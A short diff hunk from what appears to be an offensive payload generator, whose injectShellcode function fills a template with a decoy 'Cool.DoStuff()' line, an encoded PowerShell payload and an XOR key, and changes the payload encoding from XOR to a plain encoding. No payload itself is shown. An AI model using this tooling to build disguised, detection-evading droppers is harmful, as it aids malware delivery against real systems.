@@ -121,7 +121,7 @@ def injectShellcode(script, runNormal, key):
           line = line.replace('$$$NORMAL$$$','Cool.DoStuff();\n')
 
         elif '$$$ENCODED$$$' in line:
-            encoded = xorEncodeFile(tmpPsFile, key)
+            encoded = encodeFile(tmpPsFile)
             line = line.replace('$$$ENCODED$$$', '\"' + encoded + '\"')
             
         elif '$$$XORKEY$$$' in line:
